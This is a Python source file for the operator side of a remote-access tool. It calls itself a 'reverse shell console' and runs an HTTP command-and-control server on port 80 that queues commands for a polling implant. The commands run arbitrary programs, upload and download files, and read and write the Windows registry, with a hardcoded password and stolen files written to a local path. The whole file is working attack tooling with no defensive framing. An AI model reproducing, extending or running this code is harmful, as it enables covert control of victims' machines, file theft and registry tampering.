import http.server
import socketserver

PORT = 80
password = "B0223BF2235A473D9E1FBA9699ECC212"


class Handler(http.server.BaseHTTPRequestHandler):
    message = "default"
    cmd_id = '0'
    location = "C:\default_filename.txt"
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write((password + "\n" + self.cmd_id + "\n" + self.message).encode('utf-8'))

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode('utf-8')
        print(post_data)

    def do_PUT(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        request = self.rfile.read(length)
        if request.decode('utf-8').startswith(password):
            data = request[len(password):]
            fp = open(self.location, "wb")
            fp.write(data)

print("Welcome to the reverse shell console. Valid commands are: exec, upload, download, regwrite, regread.")

while True:
    command = input("# ")
    if command == "exec":
        exec_cmd = input("Command to execute: ")
        Handler.message = exec_cmd
        Handler.cmd_id = '1'
        socketserver.TCPServer(("", PORT), Handler).handle_request()
        socketserver.TCPServer(("", PORT), Handler).handle_request()
    elif command == "upload":
        file = input("File to upload: ")
        location = input("Remote destination: ")
        fp = open(file, "rb")
        contents = fp.read()
        encoded_contents = ""
        for ch in contents:
            print(int(ch))
            encoded_contents += format(ch, "x")
        Handler.message = location + "\n" + encoded_contents
        Handler.cmd_id = '2'
        socketserver.TCPServer(("", PORT), Handler).handle_request()
    elif command == "download":
        file = input("File to download: ")
        location = input("Local destination: ")
        Handler.message = file
        Handler.cmd_id = '3'
        Handler.location = location
        socketserver.TCPServer(("", PORT), Handler).handle_request()
        socketserver.TCPServer(("", PORT), Handler).handle_request()
    elif command == "regread":
        print("Choose Key (1-5)")
        print("1) HKEY_CLASSES_ROOT")
        print("2) HKEY_CURRENT_CONFIG")
        print("3) HKEY_CURRENT_USER")
        print("4) HKEY_LOCAL_MACHINE")
        key = input("5) HKEY_USERS")
        subkey = input("Subkey: ")
        value = input("Value: ")
        Handler.message = key + "\n" + subkey + "\n" + value
        Handler.cmd_id = '4'
        socketserver.TCPServer(("", PORT), Handler).handle_request()
        socketserver.TCPServer(("", PORT), Handler).handle_request()
    elif command == "regwrite":
        print("Choose Key (1-5)")
        print("1) HKEY_CLASSES_ROOT")
        print("2) HKEY_CURRENT_CONFIG")
        print("3) HKEY_CURRENT_USER")
        print("4) HKEY_LOCAL_MACHINE")
        key = input("5) HKEY_USERS")
        subkey = input("Subkey: ")
        value = input("Value: ")
        data = input("Data: ")
        Handler.message = key + "\n" + subkey + "\n" + value + "\n" + data
        Handler.cmd_id = '5'
        socketserver.TCPServer(("", PORT), Handler).handle_request()
